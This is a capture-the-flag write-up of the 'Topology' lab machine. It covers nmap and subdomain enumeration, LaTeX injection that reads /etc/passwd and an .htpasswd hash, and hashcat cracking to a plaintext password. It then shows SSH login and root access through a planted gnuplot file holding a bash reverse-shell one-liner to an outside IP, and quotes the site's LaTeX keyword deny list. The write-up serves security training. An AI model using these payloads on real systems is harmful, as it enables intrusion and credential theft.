# nmap

```
# Nmap 7.93 scan initiated Fri Aug  4 10:03:29 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.217
Warning: 10.10.11.217 giving up on port because retransmission cap hit (6).
Nmap scan report for topology.htb (10.10.11.217)
Host is up, received user-set (0.31s latency).
Scanned at 2023-08-04 10:03:30 EDT for 2319s
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     REASON      VERSION
3/tcp     filtered compressnet no-response
22/tcp    open     ssh         syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp    open     http        syn-ack     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```
# Directory enumeration for topology.htb
```
/images                 [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1153ms]
/css                    [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5386ms]
/images                 [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5252ms]
/javascript             [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5245ms]
/server-status          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5572ms]
```

# Subdomain enumeration for topology.htb
```
dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 253ms]
stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 1452ms]
```

# Latex Injection on latex.topology.htb
Browsing to http://topology.htb, we are able to find another subdomain which is latex.topology.htb. Adding ```latex.topology.htb``` to our /etc/hosts file, we are able to access latex.topology.htb

The way latex.topology.htb works is that, we will provide a latex equation to the form and the website will return us an image of the equation. Using the payload below, we realize that we are able to read from the 1st line of /etc/passwd file

```
\catcode`\%=12 \newread\file \openin\file=/etc/passwd \read\file to\line \text{\line} \closein\file
```

However, we want to read the entire file document. We will start by fuzzing the endpoints to find out which commands are blacklisted. We are able to find that the following commands are blacklisted

```
\input{/etc/passwd}
\include{/etc/password}
```

```lstinputlisting``` is not blacklisted, but it throws back an error when we try to use this payload. The reason is because the syntax of the latex that is to be used needs to be in inline math mode syntax. Since  ```\lstinputlisting{/etc/passwd}```  is not in latex inline math mode, this will throw an error to use.

Modifying the ```lstinputlisting``` to the inline math mode below, we are able to read the entire /etc/passwd file

```
$\lstinputlisting{/etc/passwd}$
```

Using the following payload, we are able to retrieve a hash belonging to vdaisley at ```/var/www/dev/.htpasswd```

```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

After extracting the hash, we will be using hashcat to crack the hash

```
┌──(kali㉿kali)-[~/Desktop/topology]
└─$ hashcat -m 1600 -a 0 hash.txt /home/kali/Desktop/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
```

# Gaining SSH access as vdaisely
Using the credentials that we have cracked earlier, we are able to gain access to dev.topology.htb. However, this site does not contain much information that we can exploit. Using the same credentials, we are able to gain SSH access.

```
┌──(kali㉿kali)-[~/Desktop/topology]
└─$ ssh vdaisley@10.10.11.217
vdaisley@10.10.11.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug  5 01:53:00 2023 from 10.10.16.5
vdaisley@topology:~$ 
```

# Obtaining user flag

```
vdaisley@topology:~$ cat user.txt
<user flag>
vdaisley@topology:~$ 
```

# Privilege Escalation
Using pspy, we are able to find that there is a command running in the backgound with root permissions. What this command does is that it will find for all the files ending with ```.plt``` in the /opt/gnuplot directory and execute ```gnuplot <.plt file>```
```
2023/08/05 07:20:01 CMD: UID=0     PID=36992  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
```

Afterwards, we realize that we are able to create our own .plt file and copy to the /opt/gnuplot directory. In this case, we are able to copy a test.plt file to the /opt/gnuplot directory and the file will be executed

```
2023/08/05 07:20:01 CMD: UID=0     PID=36992  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;                                                                                                              
2023/08/05 07:20:01 CMD: UID=0     PID=36993  | gnuplot /opt/gnuplot/loadplot.plt 
2023/08/05 07:20:01 CMD: UID=0     PID=36994  | /bin/sh /opt/gnuplot/getdata.sh 
2023/08/05 07:20:01 CMD: UID=0     PID=36995  | /bin/sh /opt/gnuplot/getdata.sh 
2023/08/05 07:20:01 CMD: UID=0     PID=36996  | gnuplot /opt/gnuplot/test.plt 
```

We can the create a reverse shell using an exploit.plt file with the following contents. We will then move the file into the /opt/gnuplot directory and a reverse shell will be spawned when the ``find /opt/gnuplot -name *.plt -exec gnuplot {} ; ``` command is executed.

```
system "bash -c 'bash -i >& /dev/tcp/10.10.16.5/4000 0>&1'"
```

# Obtaining root flag

```
root@topology:~# cat /root/root.txt
cat /root/root.txt
<root flag>
root@topology:~# 

```

# Code Analysis of equation.php
From the source code, the code does protect against some of the latex injection by filtering against some of the commonly used latex injection payloads. However, in this case there is no filtering against ```lstinputlisting``` and so, we could use that to extract the files from the backend server.

```
filterstrings = array("\\begin","\\immediate","\\usepackage","\\input","\\write","\\loop","\\include","\\@","\\while","\\def","\\url","\\href","\\end");
```

Also, we can see it will convert the our input latex contents the following latex content as shown below. This allows us to simply inject any latex payload using inline math mode syntax to achieve our exploits.

```
\\documentclass{standalone}
\\input{../header}
\\begin{document}
<latex contents>
\\end{document}
```
